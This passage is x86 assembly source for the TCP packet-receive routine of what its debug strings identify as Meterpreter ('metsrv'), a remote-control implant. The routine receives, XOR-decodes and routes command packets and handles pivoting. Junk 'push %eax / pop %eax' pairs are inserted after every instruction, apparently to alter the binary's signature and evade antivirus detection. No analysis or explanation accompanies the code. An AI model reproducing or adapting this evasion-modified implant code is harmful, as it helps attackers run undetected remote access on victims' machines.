	.ascii "[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]\0"
	.align 4
LC12:
	.ascii "[TCP] discovered a length header, assuming it's metsrv of length %d\0"
	.align 4
LC13:
	.ascii "[TCP] XOR key looks fine, moving on\0"
LC14:
	.ascii "[TCP] Payload length is %d\0"
	.align 4
LC15:
	.ascii "[TCP] total buffer size for the packet is %d\0"
	.align 4
LC16:
	.ascii "[TCP] Failed to create the packet buffer\0"
	.align 4
LC17:
	.ascii "[TCP] Allocated packet buffer at %p\0"
	.align 4
LC18:
	.ascii "[TCP] Failed to get all the payload bytes\0"
	.align 4
LC19:
	.ascii "[TCP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\0"
	.align 4
LC20:
	.ascii "[TCP] Session GUIDs match (or packet guid is null), decrypting packet\0"
	.align 4
LC21:
	.ascii "[TCP] Session GUIDs don't match, looking for a pivot\0"
	.align 4
LC22:
	.ascii "[TCP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)\0"
	.align 4
LC23:
	.ascii "[TCP] Session GUIDs don't match, can't find pivot!\0"
LC24:
	.ascii "[TCP] Freeing stuff up\0"
LC25:
	.ascii "[TCP] Packet receive finished\0"
	.text
	.def	_packet_receive;	.scl	3;	.type	32;	.endef
_packet_receive:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%edi
push %eax
pop %eax
	pushl	%esi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	movl	$65916, %eax
push %eax
pop %eax
	call	___chkstk_ms
push %eax
pop %eax
	subl	%eax, %esp
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	movl	$0, -48(%ebp)
push %eax
pop %eax
	movl	$0, %ecx
push %eax
pop %eax
	movl	$32, %eax
push %eax
pop %eax
	andl	$-4, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L55:
	movl	%ecx, -124(%ebp,%eax)
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	cmpl	%edx, %eax
push %eax
pop %eax
	jb	L55
push %eax
pop %eax
	movl	$1, -36(%ebp)
push %eax
pop %eax
	movl	$0, -40(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_acquire
push %eax
pop %eax
	movl	$LC8, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L57
push %eax
pop %eax
L61:
	movl	$32, %eax
push %eax
pop %eax
	subl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	leal	-124(%ebp), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__recv@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -80(%ebp)
push %eax
pop %eax
	cmpl	$0, -80(%ebp)
push %eax
pop %eax
	jg	L58
push %eax
pop %eax
	movl	$1168, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L58:
	movl	-80(%ebp), %eax
push %eax
pop %eax
	addl	%eax, -28(%ebp)
push %eax
pop %eax
	cmpl	$32, -28(%ebp)
push %eax
pop %eax
	je	L60
push %eax
pop %eax
	jmp	L57
push %eax
pop %eax
L60:
	movl	$0, -36(%ebp)
push %eax
pop %eax
L57:
	cmpl	$0, -36(%ebp)
push %eax
pop %eax
	jne	L61
push %eax
pop %eax
	cmpl	$32, -28(%ebp)
push %eax
pop %eax
	je	L62
push %eax
pop %eax
	movl	$LC9, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L62:
	movzbl	-121(%ebp), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movzbl	-122(%ebp), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movzbl	-123(%ebp), %eax
push %eax
pop %eax
	movzbl	%al, %edx
push %eax
pop %eax
	movzbl	-124(%ebp), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC10, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	leal	-124(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$31, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$30, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65676(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$29, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65680(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$28, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65684(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$27, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65688(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$26, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65692(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$25, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65696(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$24, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65700(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$23, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65704(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$22, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65708(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$21, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65712(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$20, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65716(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$19, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65720(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$18, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65724(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$17, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65728(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$16, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65732(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$15, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65736(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$14, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65740(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$13, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65744(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$12, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65748(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$11, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65752(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$10, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65756(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$9, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65760(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$8, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65764(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$7, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65768(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$6, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65772(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$5, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$3, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65776(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%edx, 128(%esp)
push %eax
pop %eax
	movl	-65676(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 124(%esp)
push %eax
pop %eax
	movl	-65680(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 120(%esp)
push %eax
pop %eax
	movl	-65684(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 116(%esp)
push %eax
pop %eax
	movl	-65688(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 112(%esp)
push %eax
pop %eax
	movl	-65692(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 108(%esp)
push %eax
pop %eax
	movl	-65696(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 104(%esp)
push %eax
pop %eax
	movl	-65700(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 100(%esp)
push %eax
pop %eax
	movl	-65704(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 96(%esp)
push %eax
pop %eax
	movl	-65708(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 92(%esp)
push %eax
pop %eax
	movl	-65712(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 88(%esp)
push %eax
pop %eax
	movl	-65716(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 84(%esp)
push %eax
pop %eax
	movl	-65720(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 80(%esp)
push %eax
pop %eax
	movl	-65724(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 76(%esp)
push %eax
pop %eax
	movl	-65728(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 72(%esp)
push %eax
pop %eax
	movl	-65732(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 68(%esp)
push %eax
pop %eax
	movl	-65736(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 64(%esp)
push %eax
pop %eax
	movl	-65740(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 60(%esp)
push %eax
pop %eax
	movl	-65744(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 56(%esp)
push %eax
pop %eax
	movl	-65748(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 52(%esp)
push %eax
pop %eax
	movl	-65752(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 48(%esp)
push %eax
pop %eax
	movl	-65756(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 44(%esp)
push %eax
pop %eax
	movl	-65760(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 40(%esp)
push %eax
pop %eax
	movl	-65764(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 36(%esp)
push %eax
pop %eax
	movl	-65768(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 32(%esp)
push %eax
pop %eax
	movl	-65772(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 28(%esp)
push %eax
pop %eax
	movl	%edi, 24(%esp)
push %eax
pop %eax
	movl	%esi, 20(%esp)
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	-65776(%ebp), %ebx
push %eax
pop %eax
	movl	%ebx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC11, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movzbl	-121(%ebp), %eax
push %eax
pop %eax
	testb	%al, %al
push %eax
pop %eax
	jne	L63
push %eax
pop %eax
	leal	-124(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%eax, -84(%ebp)
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC12, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	subl	$28, %eax
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	jmp	L64
push %eax
pop %eax
L68:
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	$65535, %edx
push %eax
pop %eax
	cmpl	$65535, %eax
push %eax
pop %eax
	cmova	%edx, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	leal	-65660(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__recv@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -88(%ebp)
push %eax
pop %eax
	cmpl	$0, -88(%ebp)
push %eax
pop %eax
	jns	L65
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	cmpl	$10035, %eax
push %eax
pop %eax
	jne	L66
push %eax
pop %eax
	jmp	L64
push %eax
pop %eax
L66:
	movl	$1168, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L67
push %eax
pop %eax
L65:
	movl	-88(%ebp), %eax
push %eax
pop %eax
	subl	%eax, -44(%ebp)
push %eax
pop %eax
L64:
	cmpl	$0, -44(%ebp)
push %eax
pop %eax
	jg	L68
push %eax
pop %eax
L67:
	cmpl	$0, -44(%ebp)
push %eax
pop %eax
	jg	L85
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$0, (%eax)
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L63:
	movl	$LC13, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-124(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -65660(%ebp)
push %eax
pop %eax
	movl	-120(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -65656(%ebp)
push %eax
pop %eax
	movl	-116(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -65652(%ebp)
push %eax
pop %eax
	movl	-112(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -65648(%ebp)
push %eax
pop %eax
	movl	-108(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -65644(%ebp)
push %eax
pop %eax
	movl	-104(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -65640(%ebp)
push %eax
pop %eax
	movl	-100(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -65636(%ebp)
push %eax
pop %eax
	movl	-96(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -65632(%ebp)
push %eax
pop %eax
	leal	-124(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movl	$28, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	leal	-124(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_xor_bytes
push %eax
pop %eax
	leal	-124(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$31, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$30, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65676(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$29, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65680(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$28, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65684(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$27, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65688(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$26, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65692(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$25, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65696(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$24, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65700(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$23, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65704(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$22, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65708(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$21, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65712(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$20, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65716(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$19, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65720(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$18, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65724(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$17, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65728(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$16, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65732(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$15, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65736(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$14, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65740(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$13, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65744(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$12, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65748(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$11, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65752(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$10, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65756(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$9, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65760(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$8, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65764(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$7, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65768(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$6, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65772(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$5, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$3, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65776(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%edx, 128(%esp)
push %eax
pop %eax
	movl	-65676(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 124(%esp)
push %eax
pop %eax
	movl	-65680(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 120(%esp)
push %eax
pop %eax
	movl	-65684(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 116(%esp)
push %eax
pop %eax
	movl	-65688(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 112(%esp)
push %eax
pop %eax
	movl	-65692(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 108(%esp)
push %eax
pop %eax
	movl	-65696(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 104(%esp)
push %eax
pop %eax
	movl	-65700(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 100(%esp)
push %eax
pop %eax
